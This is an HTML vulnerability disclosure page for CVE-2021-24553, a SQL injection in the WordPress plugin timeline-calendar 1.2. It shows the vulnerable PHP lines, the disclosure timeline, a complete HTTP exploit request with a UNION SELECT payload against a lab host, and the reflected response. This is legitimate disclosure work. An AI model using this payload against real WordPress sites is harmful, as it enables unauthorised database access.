<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : timeline-calendar | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Timeline Calendar</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/timeline-calendar/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : timeline-calendar</a></div>
<div>Effected Version : 1.2 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Administrator</div>
<div>CVE Number : CVE-2021-24553</div>
<div>Identified by : <a href="/author/shreya_pohekar/">Shreya Pohekar</a></div>
<div><a href="https://wpscan.com/plugin/timeline-calendar/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>June 1, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	June 3, 2021 : Plugin  Closed</li>
	
	
	<li>July 20, 2021 : CVE Assigned</li>
	
	<li>July 23, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>The edit event takes in <code>edit</code> at a GET parameter which is passed to SQL statement without proper sanitization, validation or escaping that leads to SQL injection.</p>
<p>Vulnerable Code: <a href="https://plugins.trac.wordpress.org/browser/timeline-calendar/trunk/timeline.php#263" target="_blank" rel="noreferrer noopener nofollow">timeline.php#263</a>
</p>
<pre><code>262:        $eid = $_GET['edit'];
263:        $load = $wpdb-&gt;get_row(&quot;SELECT day, month, event FROM &quot;.TABLE_NAME.&quot; WHERE id = $eid&quot;);

</code></pre><h4 id="poc-screenshot">PoC Screenshot</h4>
<p><img src="/disclosure_screenshots/timeline-calendar-poc.png" alt="PoC Screenshot"></p>
<p><img src="/disclosure_screenshots/timeline-calendar-poc-1.png" alt="PoC Screenshot-1"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>GET /wp-admin/admin.php?page=events&amp;edit=-4292 UNION ALL SELECT user(),user(),current_user()-- - HTTP/1.1
Host: 172.28.128.50
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.28.128.50/wp-admin/admin.php?page=events
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_232395f24f6cff47569f2739c21385d6=admin%7C1620290323%7CYYnxB94vQX1FKlaA2F7JKfMusMrf928RhhdRmoRmoCk%7Cfc5ac31fd026676399a40e26ddf1aa8f2ac86a4a56a6c929d74afffcef32f8fe; __eucookielaw=true; _ga=GA1.1.436418670.1617784311; wp-settings-time-4=1619288085; ignored_html_tags=1; manage_settings=1; sk-id=-732593242; comment_author_232395f24f6cff47569f2739c21385d6=admin; comment_author_email_232395f24f6cff47569f2739c21385d6=admin%40localhost.com; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_232395f24f6cff47569f2739c21385d6=admin%7C1620290323%7CYYnxB94vQX1FKlaA2F7JKfMusMrf928RhhdRmoRmoCk%7Cd62e1626fac1ba4441235d4a8b1fb0b6c8a820833ec0dd90fd61c5cd4e81feeb; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse%26posts_list_mode%3Dlist; wp-settings-time-1=1620117523
Connection: close

</code></pre><h4 id="response">Response</h4>
<pre><code>        &lt;option value=&quot;1&quot;&gt;January&lt;/option&gt;&lt;option value=&quot;2&quot;&gt;February&lt;/option&gt;&lt;option value=&quot;3&quot;&gt;March&lt;/option&gt;&lt;option value=&quot;4&quot;&gt;April&lt;/option&gt;&lt;option value=&quot;5&quot;&gt;May&lt;/option&gt;&lt;option value=&quot;6&quot;&gt;June&lt;/option&gt;&lt;option value=&quot;7&quot;&gt;July&lt;/option&gt;&lt;option value=&quot;8&quot;&gt;August&lt;/option&gt;&lt;option value=&quot;9&quot;&gt;September&lt;/option&gt;&lt;option value=&quot;10&quot;&gt;October&lt;/option&gt;&lt;option value=&quot;11&quot;&gt;November&lt;/option&gt;&lt;option value=&quot;12&quot;&gt;December&lt;/option&gt;       &lt;/select&gt;&lt;br /&gt;
        This event happens: &lt;br /&gt;&lt;textarea cols=&quot;30&quot; rows=&quot;4&quot; name=&quot;event&quot; id=&quot;event&quot; style=&quot;width: 500px; height: 200px;&quot;&gt;bob@localhost&lt;/textarea&gt;
    &lt;p style=&quot;font-style: italic;&quot;&gt;&lt;small&gt;You can use HTML codes.&lt;/small&gt;&lt;/p&gt;
        &lt;input type=&quot;hidden&quot; id=&quot;timeline_edit&quot; name=&quot;timeline_edit&quot; /&gt;
    &lt;input type=&quot;hidden&quot; id=&quot;timeline_id&quot; name=&quot;timeline_id&quot; value=&quot;-4292 UNION ALL SELECT user(),user(),current_user()-- -&quot; /&gt;
        &lt;input name=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Edit&quot; class=&quot;button-primary&quot; /&gt;&amp;nbsp;&lt;input type=&quot;button&quot; name=&quot;delete&quot; value=&quot;Delete&quot; class=&quot;button&quot; onclick=&quot;goConfirm('Are you sure?','http://172.28.128.50/wp-admin/admin.php?page=events&amp;amp;delete=-4292 UNION ALL SELECT user(),user(),current_user()-- -');&quot; /&gt;&amp;nbsp;&lt;input type=&quot;button&quot; name=&quot;cancel&quot; value=&quot;Cancel&quot; class=&quot;button&quot; onclick=&quot;javascript:history.go(-1)&quot; /&gt;    &lt;input type=&quot;hidden&quot; id=&quot;_wpnonce&quot; name=&quot;_wpnonce&quot; value=&quot;d3bb93c11a&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;_wp_http_referer&quot; value=&quot;/wp-admin/admin.php?page=events&amp;amp;edit=-4292 UNION ALL SELECT user(),user(),current_user()-- -&quot; /&gt;    &lt;/form&gt;
    &lt;/div&gt;

</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

